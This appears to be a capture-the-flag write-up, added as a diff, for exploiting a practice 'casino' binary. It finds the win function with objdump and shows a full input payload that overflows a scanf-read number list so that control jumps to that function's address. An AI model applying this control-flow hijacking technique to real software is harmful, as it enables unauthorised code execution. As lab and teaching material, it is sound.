@@ -1,0 +1,62 @@
+I. Identify target func address we want to call (ghidra + objdump):
+
+$: objdump -d -M intel casino | grep win
+080486e6 <win>:
+ 80486f7:	74 19                	je     8048712 <win+0x2c>
+ 804872b:	74 2c                	je     8048759 <win+0x73>
+
+
+II. Identify vulnerable func:
+The scanf from the list of numbers selection looks promising.
+
+III. Some people would compute the offsets based on addresses but true
+hackers just wing it. My magic number 34. 
+
+IV. Allow the casino to run once to generate a magic number for the win func.
+
+V. Compose a payload (must contain integers) then the address of the target
+func, in decimal, then the magic number, and voila.
+
+Payload (see run.sh)
+1       // Name
+x       // Empty number list to generate magic unmber
+Yx0A2   // Yes to continue then a list of 34 random ints
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+2
+134514406 //Address of win func
+1
+123 // Param for win func
+x
+n
+
